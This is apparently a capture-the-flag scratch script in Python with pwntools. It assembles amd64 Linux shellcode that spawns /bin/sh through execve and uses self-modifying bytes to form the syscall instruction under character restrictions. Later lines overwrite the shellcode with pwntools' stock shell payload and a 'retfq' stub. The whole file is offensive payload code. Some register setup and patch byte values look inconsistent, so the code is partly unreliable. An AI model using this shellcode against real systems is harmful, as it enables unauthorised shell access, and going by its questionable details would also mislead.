from pwn import *
context(arch = 'amd64', os = 'linux')



shellcode = '''
	/* 设置 rdi -> /bin///sh */
	push 0x68
	push 0x732f2f2f
	push 0x6e69622f
	mov rdi, rcx
	/* 构造 syscall */
	push 0x40
	pop rdx	
	sub byte ptr[rax+0x21], dl
	sub byte ptr[rax+0x22], dl
	
	/* 设置 rsi = 0, rdx = 0 */
	push rbx
	pop rsi
	push rbx
	pop rdx
	push rbx
	pop rax
	xor al, 0x3B
	push rdx
	pop rdx
'''

shellcode = asm(shellcode) + b'\x4B\x4F'
print(hex(len(shellcode) - 2))
print(shellcode)

shellcode = shellcraft.sh()

shellcode = asm("retfq")

print(shellcode)
